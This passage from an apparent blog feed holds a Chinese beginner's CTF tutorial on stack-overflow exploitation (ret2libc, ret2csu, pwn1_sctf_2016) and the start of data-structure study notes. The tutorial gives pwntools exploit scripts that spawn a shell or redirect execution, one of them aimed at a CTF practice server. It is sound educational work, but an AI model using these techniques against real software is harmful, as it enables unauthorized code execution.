text"><br>成功打通，这里需要注意的是，如果是正常调用system函数，会有一个对应的返回地址，这里使用<code>bbbb</code>作为虚假的地址，其后参数对应的参数内容。</p><p><strong>例二</strong>：<br>拿到题目，首先使用checksec查保护：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ce488c91-cfc3-4de2-9d2d-fc059f89f21e.png" alt="alt text text">]<br>可以看到，这里依然只开启了堆栈不可执行保护。接下，我们使用ida反编译它：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/fe0e657c-636a-4e99-925b-f13ffa827c88.png" alt="alt text"><br>标准的gets()函数，标准的栈溢出漏洞。我们使用<code>ROPgadget</code>来查找是否存在<code>/bin/sh</code>字符串：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/9d242026-6f0e-4a83-896d-b4e21138b690.png" alt="alt text"><br>那么我们这里就需要自己读取字符串，然后控制程序执行<code>system('/bin/sh')</code>。<br>首先，找到gets函数的plt表地址<code>0x08048460</code>、然后，再找到system的plt表地址<code>0x08048490</code>。还需要一个<code>gadget</code>来读取字符串<code>/bin/sh</code>，我们使用<code>ROPgadget</code>来查找控制ebx寄存器的<code>gadget</code>。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/4a16c830-fd33-47a0-b358-0e04b3432299.png" alt="alt text"><br>我们选择第二个：<code>0x0804843d : pop ebx ; ret</code>，并且，由于程序中并不存在一个后门字符串<code>/bin/sh</code>，所以我们需要一个<code>gadget</code>段来写入该字符串，也就是覆盖<code>bss</code>段上某个变量的内容。这里我们选择<code>buf2</code>，地址：<code>0x0804A080</code>。<br>接下来我们就可以编写我们的exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc2&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">system_plt = <span class="number">0x08048490</span>  </span><br><span class="line">gets_plt = <span class="number">0x08048460</span>  </span><br><span class="line">pop_ebx = <span class="number">0x0804843d</span>  </span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span>  </span><br><span class="line">  </span><br><span class="line">payload = flat(  </span><br><span class="line">  [<span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span>, gets_plt, pop_ebx, buf2_addr, system_plt, <span class="number">0xdeadbeef</span>, buf2_addr]  </span><br><span class="line">)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">sh.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功打通<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/36aa1ad5-b6a5-45aa-8a5a-9492b9558b0c.png" alt="alt text"></p><p><strong>例三</strong>：<br>拿到题目之后查保护：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/cbc83b8f-2a12-48ed-b1c1-a7eae4eccd81.png" alt="alt text"><br>发现开启了栈不可执行保护，接着我们使用ida进行反编译<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7dd1a311-d017-4881-8262-a35b84bea5fc.png" alt="alt text"><br>gets栈溢出漏洞，再寻找，本题中并没有给出system函数，那么如何获取到system函数的地址呢，这里主要利用两个知识点：</p><ul><li>system属于libc，而libc.so动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有ASLR保护，也只是针对地址中间位进行随机，最低的12位并不会发生改变，而libc在github上有人进行收集，<a href="https://github.com/niklasb/libc-database">libc-database</a></li></ul><p>所以如果我们知道了libc中某个函数的地址，那么我们就可以确定该程序利用的libc。进而我们就可以知道system中的地址。<br>那么如何得到libc中的某个函数的地址，一般常用的方法是采用got表泄露，即输出某个函数对应的got表项的内容。当然，由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。<br>这里使用libc的利用工具<a href="https://github.com/lieanu/LibcSearcher">LibcSearch</a>,而且，在得到libc之后，其实libc中也是有/bin/sh字符串，所以我们可以一起获得/bin/sh字符串的地址。<br>这里我们泄露<code>__libc_start_main</code>的地址，这时因为它是程序最初被执行的地方。基本利用思路如下：</p><ul><li>泄露__libc_start_main地址</li><li>获取libc版本</li><li>获取system地址与/bin/sh的地址</li><li>再次执行源程序</li><li>触发栈溢出执行system(‘/bin/sh’)</li></ul><h4 id="ret2csu">ret2csu</h4><p><strong>原理</strong><br>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多时候，我们很难找到每一个寄存器对应的gadgets。这时候，我们可以利用x64下的<code>__libc_csu_init</code>中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(不同版本的这个函数有一定的区别)。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)  </span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init  </span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o  </span><br><span class="line">.text:00000000004005C0                 push    r15  </span><br><span class="line">.text:00000000004005C2                 push    r14  </span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi  </span><br><span class="line">.text:00000000004005C7                 push    r13  </span><br><span class="line">.text:00000000004005C9                 push    r12  </span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry  </span><br><span class="line">.text:00000000004005D2                 push    rbp  </span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry  </span><br><span class="line">.text:00000000004005DA                 push    rbx  </span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi  </span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx  </span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12  </span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8  </span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3  </span><br><span class="line">.text:00000000004005EC                 call    _init_proc  </span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp  </span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616  </span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx  </span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]  </span><br><span class="line">.text:0000000000400600  </span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j  </span><br><span class="line">.text:0000000000400600                 mov     rdx, r13  </span><br><span class="line">.text:0000000000400603                 mov     rsi, r14  </span><br><span class="line">.text:0000000000400606                 mov     edi, r15d  </span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]  </span><br><span class="line">.text:000000000040060D                 add     rbx, 1  </span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp  </span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600  </span><br><span class="line">.text:0000000000400616  </span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j  </span><br><span class="line">.text:0000000000400616                 add     rsp, 8  </span><br><span class="line">.text:000000000040061A                 pop     rbx  </span><br><span class="line">.text:000000000040061B                 pop     rbp  </span><br><span class="line">.text:000000000040061C                 pop     r12  </span><br><span class="line">.text:000000000040061E                 pop     r13  </span><br><span class="line">.text:0000000000400620                 pop     r14  </span><br><span class="line">.text:0000000000400622                 pop     r15  </span><br><span class="line">.text:0000000000400624                 retn  </span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure><p>这里我们可以利用以下几点</p><ul><li>从0x040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制<code>rbx,rbp,r12,r13,r14,r15</code>寄存器的数据。</li><li>从0x0400600到0x0400609，我们可以将r13赋给rdx，将r14赋给rsi，将r15d赋给edi(注意，虽然这里赋给的是edi，<strong>但其实此时rdi的高32位寄存器值为0（自行调试）</strong>，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位)，而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说可以控制rbx为0，r12为存储我们想要调用的函数地址。</li><li>从0x040060D到0x0400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li></ul><h2 id="练习">练习</h2><h3 id="pwn1-sctf-2016">pwn1_sctf_2016</h3><p>打开运行一下，发现是将输入的语句重新打印出来，猜测可能是格式化字符串或者缓冲区溢出，使用checksec查一下保护，发现是32位程序，并且只开了栈不可执行保护。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/c09cdc1a-90d4-4c49-8c13-4d856f1e88f4.png" alt="alt text"><br>使用ida32位打开，进入vuln()函数中，进行分析，反汇编出来是使用c++编写的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string *__stdcall <span class="title">replace</span><span class="params">(std::string *a1, std::string *a2, std::string *a3)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+Ch] [ebp-4Ch]  </span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">4</span>]; <span class="comment">// [esp+10h] [ebp-48h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+14h] [ebp-44h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+1Bh] [ebp-3Dh] BYREF  </span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+1Ch] [ebp-3Ch]  </span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">4</span>]; <span class="comment">// [esp+20h] [ebp-38h] BYREF  </span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+24h] [ebp-34h] BYREF  </span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+28h] [ebp-30h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+2Fh] [ebp-29h] BYREF  </span></span><br><span class="line">  <span class="type">int</span> v13[<span class="number">2</span>]; <span class="comment">// [esp+30h] [ebp-28h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">4</span>]; <span class="comment">// [esp+38h] [ebp-20h] BYREF  </span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+3Ch] [ebp-1Ch]  </span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">4</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF  </span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+44h] [ebp-14h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">4</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">8</span>]; <span class="comment">// [esp+4Ch] [ebp-Ch] BYREF  </span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> ( std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>) != <span class="number">-1</span> )  </span><br><span class="line">  &#123;  </span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v7);  </span><br><span class="line">    v8 = std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);  </span><br><span class="line">    std::string::<span class="built_in">begin</span>((std::string *)v9);  </span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v10);  </span><br><span class="line">    std::string::<span class="built_in">begin</span>((std::string *)&amp;v11);  </span><br><span class="line">    std::string::string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;&gt;(v6, v11, v10, &amp;v7);  </span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v7);  </span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v12);  </span><br><span class="line">    std::string::<span class="built_in">end</span>((std::string *)v13);  </span><br><span class="line">    v13[<span class="number">1</span>] = std::string::<span class="built_in">length</span>(a3);  </span><br><span class="line">    v15 = std::string::<span class="built_in">find</span>(a2, a3, <span class="number">0</span>);  </span><br><span class="line">    std::string::<span class="built_in">begin</span>((std::string *)v16);  </span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(v14);  </span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;::<span class="keyword">operator</span>+(&amp;v17);  </span><br><span class="line">    std::string::string&lt;__gnu_cxx::__normal_iterator&lt;<span class="type">char</span> *,std::string&gt;&gt;(v5, v17, v13[<span class="number">0</span>], &amp;v12);  </span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v12);  </span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;((std::string *)v19);  </span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;((std::string *)v18);  </span><br><span class="line">    std::string::<span class="keyword">operator</span>=(a2, v18, v5, v4);  </span><br><span class="line">    std::string::~<span class="built_in">string</span>(v18);  </span><br><span class="line">    std::string::~<span class="built_in">string</span>(v19);  </span><br><span class="line">    std::string::~<span class="built_in">string</span>(v5);  </span><br><span class="line">    std::string::~<span class="built_in">string</span>(v6);  </span><br><span class="line">  &#125;  </span><br><span class="line">  std::string::<span class="built_in">string</span>(a1, a2);  </span><br><span class="line">  <span class="keyword">return</span> a1;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax  </span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF  </span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF  </span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);  </span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);  </span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);  </span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);  </span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);  </span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);  </span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);  </span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);  </span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);  </span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);  </span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);  </span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);  </span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);  </span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);  </span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);  </span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);  </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟着分析一下，程序在干什么。<br>首先打印一句话，然后使用fgets()函数从 edata（通常是一个 FILE* 指针）中读取最多 31 个字符（+1 个 \0 作为结尾）到 s 所指向的缓冲区中。然后将s的值传递给string类型的input中。v4被初始化为&quot;you&quot;，v6被初始化为&quot;I&quot;。这里发现了一个replace函数，双击进去发现是一个自定义函数，我附到上述去，继续分析。该代码的作用是将传入的参数中进行查找并替换的一个功能。接下来将v3，v6，v4的值传递给input，最后，使用strcpy函数将v0的值复制到s，然后输出打印出来。<br>程序的运行逻辑大概就是这样。<br>因为初学，所以还没有看出来有什么漏洞，上网查了下，发现strcpy()函数是一个高危函数，该函数可能会造成栈溢出漏洞：<br>使用ida查看s到栈的距离为<code>0x03C</code>，再加上4为返回地址。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/52a4f9a4-4bee-4925-9af9-31b4a552d518.png" alt="alt text"><br><code>shift+f12</code>查看，存在<code>cat flag.txt</code>的命令，所以我们需要覆盖的地址为这个地址。<br>[<img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/7f01ebb2-4780-4aac-9671-aa4af3addc29.png" alt="alt text"><br>为<code>0x08048F0D</code><br>接下来我们只要将栈上地址覆盖到getflag函数地址即可，但是注意，程序中有<br><code>fgets(s, 32, edata);</code>函数限制了输入，只能输入31个字符，这对于我们要覆盖栈是远远不够的，但是，程序中会将<code>I</code>转换成<code>you</code>，这就给了我们思路。<br>我们在覆盖栈时需要<code>0x3c + 4 = 64</code>字节的数据，所以只需要21个I在加一个<code>a</code>即可覆盖到返回地址为getflag函数执行地址。<br>现在我们开始编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># sh = process(&quot;./pwn1_sctf_2016&quot;)  </span></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">25733</span>)  </span><br><span class="line">success_addr = <span class="number">0x08048F0D</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&quot;I&quot;</span> * <span class="number">0x15</span> + <span class="string">b&#x27;a&#x27;</span> + p32(success_addr)  </span><br><span class="line">  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>我们在本地创建<code>flag.txt</code>，运行<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/04c9a731-92fc-4aca-97b4-5ffdbd1e3120.png" alt="alt text"><br>ok，成功，接下来连接远程地址。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/8217fd21-25bc-4a8c-b5ba-e680d8f8bb56.png" alt="alt text"><br>成功获取flag。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/1d13f7ab-871b-430f-a6fe-777be9890b19.png" alt="alt text"></p><p>参考：<br><a href="https://ctf-wiki.org/">CTF-WIKI</a><br><a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">C语言函数调用栈一</a><br><a href="https://www.cnblogs.com/clover-toeic/p/3756668.html">C语言函数调用栈二</a></p>]]></content>
    
    
    <summary type="html">PWN入门之路一，栈溢出！！！</summary>
    
    
    
    <category term="CTF" scheme="https://www.xvzhang.fun/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>数据结构复习</title>
    <link href="https://www.xvzhang.fun/posts/d30a74bb.html"/>
    <id>https://www.xvzhang.fun/posts/d30a74bb.html</id>
    <published>2025-05-07T08:00:51.000Z</published>
    <updated>2025-05-10T14:59:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1>数据结构复习</h1><h2 id="绪论">绪论</h2><ul><li>如何用程序将现实问题信息化。</li><li>如何用计算机高效地处理这些信息从而创造价值。</li></ul><h3 id="基本概念">基本概念</h3><p><strong>数据</strong>： 数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合，数据是计算机程序加工的原料。<br><strong>数据元素、数据项</strong>：数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，数据项是构成数据元素的不可分割的最小单位。</p><h4 id="数据结构、数据对象">数据结构、数据对象</h4><p><strong>数据结构</strong>是相互之间存在一种或多种特定关系的数据元素的集合。<br><strong>数据对象</strong>是具有相同性质的数据元素的集合，是数据的一个子集</p><h4 id="数据结构的三要素">数据结构的三要素</h4><p>逻辑结构：集合、线性结构、树形结构、图状结构（网状结构）<br><strong>集合</strong>： 各个元素同属一个集合，别无其他关系。<br><strong>线性结构</strong>： 数据元素之间是一对一的关系。除了第一个元素，所有元素都有唯一的前驱；除了最后一个元素，所有元素都有唯一的后继。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/ca1a9bbb-4b44-4467-88b3-644625dd7acc.png" alt="alt text"><br><strong>树形结构</strong>：数据元素之间是一对多的关系。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/5e1c1b28-8801-4d75-b69e-c2aa00b9937a.png" alt="alt text"><br><strong>图结构</strong>： 数据元素之间是多对多的关系。<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b8caaaaf-2abe-4ff3-b2fa-e43fdc912688.png" alt="alt text"><br>数据的物理结构（存储结构）:<br>如何用计算机标识数据元素的逻辑关系。<br>线性结构（逻辑结构）：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/20423fc3-d441-474a-9ef4-2b40a8cde0a5.png" alt="alt text"><br><strong>顺序存储</strong>：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现。<br>内存上的分布：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/b38fbac9-44c3-456b-8303-531645d48f9c.png" alt="alt text"><br><strong>链式存储</strong>：把逻辑上相邻的元素在物理位置上可以不相邻，借助提示元素存储地址的指针来表示元素之间的逻辑关系。<br>内存上的表示：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/26dbfb1a-b791-4f08-9759-1ea82f1acc39.png" alt="alt text"><br><strong>索引存储</strong>：在存储元素信息的同时，还建立附加的索引标。索引表中的每项称为索引项，索引项的一般形式是（关键字，地址）<br>内存表示：<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/74b08855-f4d8-44c5-b73e-25075d91da06.png" alt="alt text"><br><strong>散列存储</strong>：根据元素的关键字直接计算出该元素的存储地址，又称哈希（Hash）存储。</p><ol><li>若采用顺序存储，则各个数据元素在物理上必须是连续的；若采用非顺序存储，则各个数据元素在物理上可以是离散的。</li><li>数据的存储结构会影响存储空间分配的方便程度。</li><li>数据的存储结构会影响对数据运算的速度。</li></ol><p><strong>数据的运算</strong>：施加在数据上的运算包括运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能：运算的实现是针对存储结构的，指出运算的具体操作步骤。</p><p><strong>数据类型、抽象数据类型</strong>：<br>数据类型是一个值的集合和定义在此集合上的一组操作的总称。</p><ol><li>原子类型，其值不可再分的数据类型。（int，bool）</li><li>结构类型。其值可以在分解为若干成分（分量）的数据类型。（结构体）。</li></ol><p>**抽象数据类型（Abstract Data Type，ADT）**是抽象数据组织及与之相关的操作。（用数学化的语言定义数据的逻辑结构、定义运算。与具体的实现无关。）<br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/de3fb598-2f10-410e-96d1-7a431f3c7321.png" alt="alt text"><br><strong>数据结构这门课着重关注的是数据元素之间的关系，和对这些数据元素的操作，而不关心具体的数据项内容</strong><br><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/d34803b8-70e2-4ff7-b93d-d0f1743919e0.png" alt="alt text"></p><h4 id="算法的基本概念">算法的基本概念</h4><p><img src="https://cdn.jsdelivr.net/gh/xvzhnang/blog-picture@main/images/24f8844f-c6db-4a3c-853d-e68135cc25ad.png" alt="alt text"></p><h5 id="什么是算法">什么是算法</h5><p>程序 = 数据结构 + 算法<br>数据结构：如何如数据正确地描述现实世界的问题，并存入计算机。<br>算法(Algorithm)是对<strong>特定问题求解步骤的一种描述</strong>，它是指令的有限序列，其中的每条指令表示一个或多个操作，也就是求解问题的步骤。(如何高效处理这些数据，以解决实际问题)。<br>例子：如做食材，又如按照顺序递归进行年龄排序。</p><h5 id="算法的特性">算法的特性</h5><ol><li>有穷性**：一个算法必需总在执行有穷步之后结束，且每一步都可在有穷时间内完成。<br><em>注</em>：算法必需是有穷的，而程序可以是无穷的。（如微信可以一直运行）</li><li>确定性**：算法中每条指令必须有确切的含义，对于相同的输入只能得出相同的输出。</li><li>可行性：算法中描述的操作都可以通过已经实现的<strong>基本运算执行有限次</strong>来实现。</li><li>输入：一个算法<strong>有零个或多个输入</strong>，这些输入取自某个特定对象的集合。</li><li>输出：一个算法<strong>有一个或多个输出</strong>，这些输出是与输入有着某种特定关系的量。</li></ol><h5 id="好-算法的特制">&quot;好&quot;算法的特制</h5><ol><li>正确性。算法应该能够正确的解决求解问题。</li><li>可读性。算法应具有良好的可读性，帮助人们理解。</li><li>健壮性。输入非法数据时，算法能适当地做出反应或进行处理，而不会产生莫名其妙的输出结果。</li><li>高效率与低存储量需求。花的时间少并且节省内存。(事件复杂度低、空间复杂度低)。</li></ol><h4 